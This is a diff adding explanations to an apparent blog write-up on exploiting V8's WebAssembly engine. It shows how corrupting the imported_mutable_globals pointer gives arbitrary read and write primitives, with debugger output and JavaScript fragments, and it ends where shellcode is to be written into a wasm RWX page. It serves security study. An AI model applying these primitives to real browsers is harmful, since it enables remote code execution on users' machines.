@@ -149,6 +149,10 @@ console.log(instance.exports.getGlobal()); // 1
 
 ## Corrupting the Imported Mutable Globals Pointer
 
+So what happens if we decide to corrupt the `imported_mutable_globals` pointer? Well it appears to
+be a external pointer (i.e. outside of the heap), so logically we should be able to read or modify
+an arbitrary location in memory. 
+
 ```js
 %DebugPrint(instance);
 %SystemBreak();
@@ -167,6 +171,10 @@ DebugPrint: 0x1f84001d4659: [WasmInstanceObject] in OldSpace
 ...
 ```
 
+When reading from the first entry in `imported_mutable_globals` we can see it holds a value of `0`.
+Continuing so the `incGlobal` function is called, we can see that this value has been updated to
+`1`. Which is what we'd expect. 
+
 ```
 pwndbg> x/gx 0x55afdf05e3e0
 0x55afdf05e3e0:	0x00001f8500001000
@@ -179,6 +187,10 @@ pwndbg> x/gx 0x00001f8500001000
 0x1f8500001000:	0x0000000000000001
 ```
 
+Let's see what happens when we completely corrupt the first pointer in the
+`imported_mutable_globals` table. That is, not the `imported_mutable_globals` pointer itself,
+but the first entry within it.
+
 ```
 pwndbg> set *(uint64_t *)(0x56394c0dc3d0) = 0x4141414141414141
 pwndbg> x/gx 0x56394c0dc3d0
@@ -188,6 +200,13 @@ Continuing.
 
 Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
 ```
+
+We receive a segmentation fault when trying to read from the location in memory we specified. In
+the disassembly below, the next step was to incremement the value retrieved by `1`, before later
+storing it back into the location in memory it was retrieved from.
+
+This is exactly the behaviour we'd expect to see from a function that increments a global
+variable.
 
 ```
  ► 0x2d0f6f7876a2    mov    ecx, dword ptr [rax]
@@ -204,6 +223,16 @@ $1 = 0x4141414141414141
 
 
 ## An Arbitrary Read Primitive
+
+So the question becomes, how do we turn this functionality into arbitrary read or write
+primitives?
+
+Well, from observing the behaviour above, it would likely involve the corruption of one primary
+value; that of the `imported_mutable_globals` pointer. But this value doesn't point directly to
+the global variable that is modified - so we'd need to point it to an area of memory we control
+and store a pointer to the memory we want to modify at that location.
+
+The below web-assembly will read a 64-bit value from a mutable global variable.
 
 ```clojure
 (module
@@ -228,7 +257,16 @@ let module = new WebAssembly.Module(wasm);
 let instance = new WebAssembly.Instance(module, {
   js: { global }
 });
+```
 
+As mentioned above, the primary objective we need to achieve is control over the
+`imported_mutable_globals` table. I did this by simply pointing it to the elements store of
+a float array. This way the entries within the table could easily be replaced.
+
+If we want to replace this value with a location on the heap, this will also require a heap
+address leak (which is easily obtained).
+
+```js
 let heap = (weak_read(0x18) >> 32n) << 32n;
 let store = [1.1];
 let elements = heap + (weak_read(addrof(store) + 0x8) & 0xffffffffn);
@@ -247,6 +285,9 @@ pwndbg> p/x $rax
 $1 = 0xdeadbeef
 ```
 
+This is easily extracted out into a function. A pointer is provided and stored in the controlled
+`imported_mutable_globals` table, and a value is read from it.
+
 ```js
 const strong_read = p => {
   store[0] = utof(p);
@@ -256,6 +297,10 @@ const strong_read = p => {
 
 
 ## An Arbitrary Write Primitive
+
+The arbitrary write primitive is implemented in an almost identical manner to the read primitive.
+However, a new web-assembly function is introduced that writes a 64-bit integer to the global
+variable.
 
 ```clojure
 (module
@@ -269,6 +314,9 @@ const strong_read = p => {
 )
 ```
 
+You can see how similar it is to the read primitive. It uses the same logic to replaced the
+pointer to the location in memory we want to modify.
+
 ```js
 const strong_write = (p, x) => {
   store[0] = utof(p);
@@ -278,6 +326,13 @@ const strong_write = (p, x) => {
 
 
 ## Code Execution
+
+In order to achieve code execution we don't actually require the arbitrary read primitive. All the
+values we need to leak are already stored on the heap.
+
+The arbitrary write primitive however, is extremely useful. In the code below, it is used to write
+shellcode to the `rwx` page allocated by a wasm instance object. This, of course, is a very well
+documented technique used to achieve code execution in V8.
 
 ```js
 let _wasm = new Uint8Array([
